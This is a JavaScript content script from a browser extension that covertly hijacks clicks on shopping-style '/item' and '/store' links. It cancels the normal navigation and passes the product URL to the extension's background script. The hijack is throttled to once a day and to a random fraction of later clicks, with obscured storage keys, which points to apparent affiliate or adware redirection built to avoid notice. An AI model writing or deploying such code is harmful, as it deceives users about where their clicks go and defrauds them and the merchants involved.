var URL = (location.href).toString().toLowerCase();
var hostName = location.hostname;
var attachedClassName = 'alb-421nkjnj532'
var countTrigger = 3;
var probabilityOfTriggering = 20;

var intervalId = null;

function modifyUrl (url) {

    if(url.startsWith('//')) url = location.protocol + url 
    if(url.startsWith('/item')) url = location.protocol + "//" + location.host + url;
    if(url) return url.split('?')[0];
    return null;

}

function doRefresh(url) {

    if(url.includes('/item')) return true;
    if(url.includes('/store')) return true;
    // if(url.includes('/category')) return true;

    return false;
}

function formatDate(date) {
    var monthNames = [
        "January", "February", "March",
        "April", "May", "June", "July",
        "August", "September", "October",
        "November", "December"
    ];

    var day = date.getDate();
    var monthIndex = date.getMonth();
    var year = date.getFullYear();

    return day + ' ' + monthNames[monthIndex] + ' ' + year;
}

chrome.storage.local.get(null, function(res) {

    let today = formatDate(new Date());

    if(res['tt0025'] !== btoa((today) + "-r00525")) {
        attachListeners(function() {
            chrome.storage.local.set({
                'tt0025': btoa((today) + "-r00525"),
            }, function() {
            });
        })
    } else if(res?.countT < countTrigger) {
        console.log('Stage2');
        let randomNumber = Math.floor(Math.random() * 100);

        console.log('randomNumber ', randomNumber);

        if(randomNumber > 0 && randomNumber < probabilityOfTriggering) {
            attachListeners(function() {
                chrome.storage.local.set({
                    countT: res?.countT ? Number(res?.countT) + 1 : 1,
                }, function() {
                    console.log("written");
                });
            })
        }
    } else if(!res?.countT) {
        console.log('Stage3');
        chrome.storage.local.set({
            countT: 0,
        }, function() {
            console.log("written");
        });
    }
});

var sendMessageToBack = function(args) {
    chrome.runtime.sendMessage({
        action: 'tt0025',
        url: args?.url ? args.url : null,
    }, function(response) {
        return true;
    });
}

var attachListeners = function(callback) {
    console.log("listeners attached");
    intervalId = setInterval(function() {
        $('*').toArray().forEach(item => {

            if(!$(item).attr('href')) return;
            if($(item).hasClass(attachedClassName)) return false;
    
            if(doRefresh($(item).attr('href'))) {
                $(item).addClass(attachedClassName);
                $(item).click(function(e) {
                    console.log("Click");
                    clearInterval(intervalId)
                    sendMessageToBack({ url: modifyUrl($(item).attr('href')) });
                    detachAllListeners();
                    callback();
                    e.preventDefault();
                    return false;
                })
            }
        })
    }, 1000);
}

var detachAllListeners = function() {
    $('.' + attachedClassName).toArray().forEach(item => {
        $(item).off('click');
    })
}